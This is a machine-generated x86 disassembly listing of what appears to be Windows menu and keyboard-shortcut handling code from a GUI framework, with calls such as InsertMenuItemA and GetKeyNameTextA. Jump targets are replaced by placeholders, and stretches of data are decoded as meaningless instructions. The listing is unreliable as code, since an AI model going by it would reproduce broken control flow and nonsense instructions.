add [ eax ] al
jmp [ eax ]
sub_447c29
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jo r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
pushfd
retn 0x44
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
push cs
push eax
popad
jb r-xdata
call eax
mov [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pushad
pop ecx
inc esp
add [ eax ] cl
add bh bh
fadd st3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x7e
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
jns r-xdata
inc ecx
je r-xdata
inc ebx
push 0x65676e61
ror [ esi ] 0x41
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
add [ esi ] al
add [ ecx ] cl
inc ecx
jne r-xdata
jpe r-xdata
test ebx ebx
je r-xdata
je r-xdata
je r-xdata
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] dh
inc ecx
add ah dl
aaa
inc ecx
add [ ecx + edi + 0x36840041 ] bh
inc ecx
add [ eax ] al
aaa
inc ecx
add [ ecx + ecx * 8 + 0x540a0044 ] ch
push eax
outsd
jo r-xdata
rcl [ ebp + edi * 2 + 0x44 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1400447d ] ch
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
ror [ gs : 0x41 ] 0x70
add [ eax ] al
push [ eax ]
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ esp + edx + 0x41 ] al
outsb
mov ah 0x6f
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43cb14
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
and [ edx ] eax
push cs
push esp
dec ebp
outsb
jne r-xdata
pop esp
and [ edx ] eax
shl [ ecx ] 0x42
add [ eax - 0x73ffbddf ] ah
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] bl
inc edx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ ecx + 0x42 ] bl
add al al
and [ edx ] eax
mov al [ 0xffffffff8c004221 ]
imul esi [ ebx + 0x74 ] 0x447e0090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 2 ] cl
add bh bh
add [ eax ] eax
jo r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
or al [ eax ]
or eax 0x756e654d
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x300041
add bh bh
mov esp 0xb40044c7
rol [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
pop es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
push cs
inc ecx
add al dh
iretd
sub_447e4c
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_4372b8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_43cb14
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_447ea4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_447edc
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403f90
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_404200
sub_447f30
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_448119
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404028
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404178
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404028
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404028
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404178
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404178
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403f90
mov eax esi
call sub_403f90
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404028
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407d54
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_40429c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_447edc
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404258
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404028
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404258
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404258
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448120
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fb4
retn
sub_448134
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404250
push eax
mov eax edi
call sub_404250
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404250
push eax
mov eax edi
call sub_404450
push eax
mov eax [ esi ]
call sub_404450
pop edx
pop ecx
call sub_407c34
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404250
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4044f0
sub_448190
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_44826b
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_448134
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_448134
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_448134
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_448134
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448272
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_447f30
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407be4
test eax eax
jne r-xdata
sub_4482a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_44a848
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_44a858
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_448308
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_44a848
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_44a848
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44a858
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44a858
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4482a8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4482a8
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_44a858
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_44a858
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_448454
push ebx
mov ebx eax
mov eax ebx
call sub_444ffc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_44d364
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44848c
push ebx
mov ebx eax
mov eax ebx
call sub_445010
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4484bc
push ebx
mov ebx eax
mov eax ebx
call sub_445024
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4484ec
push ebx
mov ebx eax
mov eax ebx
call sub_44504c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44851c
push ebx
mov ebx eax
mov eax ebx
call sub_445074
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_40439c
je r-xdata
mov al 0x1
pop ebx
retn
sub_448550
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_445038
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44858c
push ebx
mov ebx eax
mov eax ebx
call sub_445088
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4485c0
push ebx
mov ebx eax
mov eax ebx
call sub_44509c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4485f4
push ebx
mov ebx eax
mov eax ebx
call sub_4450b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448628
push ebx
mov ebx eax
mov eax ebx
call sub_419a50
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_448650
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_448670
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44a6b0
sub_448690
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44a720
sub_4486b0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44a774
sub_4486d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4486ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403fe4
sub_448710
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44a8a0
sub_448730
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44a87c
sub_448750
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_44a890
sub_448770
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44879c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41914c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_448288
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44b1ac
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_448818
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44d148
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_44a848
test eax eax
jg r-xdata
mov edx esi
call sub_44abe0
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_44a858
call sub_403258
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403258
lea eax [ esi + 0x44 ]
call sub_40cb64
lea eax [ esi + 0x78 ]
call sub_40cb64
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_448c34
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413c80
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
call sub_403258
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4488cc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_448b27
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448b2e
lea eax [ ebp - 0x40 ]
call sub_403f90
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404028
mov eax ebx
call sub_44a848
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_448ddc
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40439c
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_44a848
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_44ae04
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_447f30
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404310
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404450
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404450
push eax
mov eax ebx
call sub_448ddc
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44a420
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_40439c
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_404450
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_44a848
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_448ddc
mov [ ebp - 0x25 ] eax
sub_448b47
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4488cc
xor eax eax
pop ebp
retn
sub_448b6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_44c440
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44b408
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44b904
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_448308
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_448bdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_448c26
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41827c
mov eax [ ebp - 0x4 ]
call sub_448190
mov edx eax
mov eax ebx
call sub_44a87c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448c2d
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
sub_448c34
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_448cac
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_41921c
sub_448c70
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_41959c
mov eax ebx
call sub_44a830
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_44a830
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403454
pop esi
pop ebx
retn
mov eax ebx
call sub_448cac
sub_448cac
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
